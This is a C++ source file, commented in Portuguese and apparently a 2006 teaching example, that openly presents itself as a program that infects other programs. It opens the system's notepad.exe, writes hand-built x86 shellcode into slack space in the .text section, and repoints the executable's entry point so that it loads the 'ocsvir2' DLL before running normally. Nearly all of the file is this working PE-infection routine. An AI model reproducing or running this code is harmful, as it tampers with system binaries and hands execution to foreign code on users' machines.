/** @file Exemplo de programa que infecta outros programas.

@author Wanderley Caloni
@date dec.2006
*/
#define _CRT_SECURE_NO_DEPRECATE
#include "../ocsvir2/ocsvir2.h"
#include <logdebug.h>
#include <pe.h>
#include <hresult.h>
#include <windows.h>

#pragma comment(lib, "CodeProtection.lib")
#pragma comment(lib, "LogDebug.lib")

#define LOG(args) LogDebug args


#pragma pack(push, 1)

struct CallLoadLibrary
{
	BYTE call01; DWORD curEip; // call curEip (endereço da próxima instrução)
	BYTE popEax01; // pop eax (armazena em eax endereço da instrução atual)
	WORD addEax01; BYTE dllOffset; // add eax, dllOffset
	BYTE pushEax01; // push eax

	BYTE movEax01; PVOID loadLib; // mov eax, loadLIb
	WORD callEax01; // call eax
	BYTE jmp01; DWORD entryPoint; // jmp entryPoint

	CHAR dllPath[sizeof(OCSVIR2_NAME)];
};

#pragma pack(pop)


HRESULT PatchVictim(PE& pe, PVOID patchCode, DWORD patchCodeSize)
{
	HRESULT hr = patchCodeSize >= sizeof(CallLoadLibrary) ? S_OK : E_OUTOFMEMORY;

	if( SUCCEEDED(hr) )
	{
		CallLoadLibrary* code = (CallLoadLibrary*) patchCode;;
		SIZE_T dllOffset = (PBYTE(&code->dllPath) - PBYTE(&code->call01));
		dllOffset -= sizeof(code->call01) + sizeof(code->curEip);
		PDWORD oep = &pe->ntHeader->OptionalHeader.AddressOfEntryPoint;
		DWORD oepOffset = pe.RVAToOffset(*oep);

		ZeroMemory(code, sizeof(CallLoadLibrary));
		code->call01 = 0xE8;
		code->popEax01 = 0x58;
		code->addEax01 = 0xC083;
		code->pushEax01 = 0x50;
		code->dllOffset = *(DWORD*) &dllOffset;
		code->movEax01 = 0xB8;
		code->loadLib = LoadLibraryA;
		code->callEax01 = 0xD0FF;
		code->jmp01 = 0xE9;
		code->entryPoint = - (pe.PointerToOffset(&code->dllPath) - oepOffset);
		strcpy(code->dllPath, OCSVIR2_NAME);

		*oep = pe.PointerToRVA(code);
	}

	return hr;
}


VOID GetVictmPath(CHAR victim[MAX_PATH])
{
	victim[0] = 0;

	if( GetVersion() < 0x80000000 ) // Plataforma NT
		GetSystemDirectory(victim, MAX_PATH);
	else
		GetWindowsDirectory(victim, MAX_PATH);

	strcat(victim, "\\notepad.exe");
}


HRESULT GetPatchCode(PE& pe, PVOID* patchCode, PDWORD patchMaxSize)
{
	HRESULT hr = S_OK;

	PIMAGE_SECTION_HEADER text = pe.FindSectionByName(".text");

	PBYTE begCode = PBYTE(pe->dosHeader) + text->PointerToRawData;
	PBYTE endCode = begCode + text->SizeOfRawData;
	PBYTE curCode = endCode - 1;

	*patchMaxSize = 0;
	while( curCode[0] == 0 && curCode[-1] == 0 && endCode > begCode )
	{
		--curCode;
		++*patchMaxSize;
	}
	*patchCode = &curCode[1];

	return hr;
}


int WINAPI WinMain(HINSTANCE, HINSTANCE, PSTR, int)
{
	DWORD ret = ERROR_SUCCESS;
	HResult hr;
	CHAR victim[MAX_PATH] = "*Error*";

	try
	{
		PE pe;
		PVOID patchCode = NULL;
		DWORD patchCodeSize = 0;

		GetVictmPath(victim);
		hr = pe.Open(victim, TRUE);
		hr = GetPatchCode(pe, &patchCode, &patchCodeSize);
		hr = PatchVictim(pe, patchCode, patchCodeSize);
		pe.Close();
	}
	catch(CAtlException& e)
	{
		LOG(("Error %08X trying to patch %s.", e.m_hr, victim));
	}

	return SUCCEEDED(hr) ? ret : HRESULT_CODE(hr);
}
